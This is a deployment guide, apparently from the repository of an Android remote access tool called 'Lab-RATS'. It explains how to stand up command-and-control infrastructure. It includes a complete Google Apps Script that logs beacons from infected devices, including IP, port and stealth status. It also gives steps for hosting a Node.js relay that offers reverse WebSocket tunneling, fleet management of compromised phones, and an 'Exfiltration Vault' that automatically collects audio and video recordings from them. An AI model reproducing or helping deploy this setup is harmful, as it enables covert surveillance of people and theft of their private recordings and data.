# 03 ⏤ C2 Deployment

Three transports. Pick by whether the target has routable IPv6.

| Transport | Reaches device when | Exfil vault | Fleet list |
| --- | --- | --- | --- |
| Direct IPv6 | target has a public GUA | no | no |
| Google Sheet | always (outbound only) | no | sheet rows |
| Node relay | always (outbound only) | yes | yes |

The Sheet and relay are **outbound-only**: the device phones home, so they work behind CGNAT and
NAT64. But you can only reach the dashboard through the relay's `/proxy/*` path — the device never
becomes directly reachable. Direct IPv6 is the only mode with real peer-to-peer latency.

---

## Option 1: Google Sheet

Logging only. Good for confirming a device is alive.

1. New [Google Sheet](https://docs.google.com/spreadsheets/u/0/).
2. Extensions → Apps Script. Paste:

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    if (sheet.getLastRow() == 0) {
      sheet.appendRow(["Timestamp","Model #","Connection Type","IP Address","Port",
                       "Active C2 Link","Battery","Stealth Status","Power","Free Storage"]);
    }
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    sheet.appendRow([
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ]);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
<details>
  <summary><b>📸 Click to View Google Sheet Reporting Example</summary></b>
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
</details>
    
---

## ✌🏻 Option 2: Tactical Node.js Backend
**Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.

**1. Fork the Lab-RATS-v1.6 repository**.
<br>**2. Create a new Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
<br>**3. Once connected, Set the Root Directory** to `c2-server/`
<br>**4. Set the Build Command** to `npm install` & **the Start Command** to `npm start`
<br>**5. Deploy!**

> [!IMPORTANT]
> **Once live, Copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, and **prepare to enter it into the APK-Builder Tool when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.
<details>
  <summary><b>📸 Click to View Render Setup</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
  </details>

<details>
  <summary><b>📸 Click to View Render C2 Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/308a906f-c331-406b-8718-23b2d113a04a" alt="Full Web Page Screenshot" width="80%">
</details>

### Advantages of Option 2:
- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks worldwide**.
- 📂 **Exfiltration Vault**: **Audio/Video recordings** are **automatically uploaded** and **stored on your server**.
- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition** and **NEW 'Quick Action' pull-down menu** to **deploy some features without directly connecting**.
- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your **P2P links are always up-to-date**.
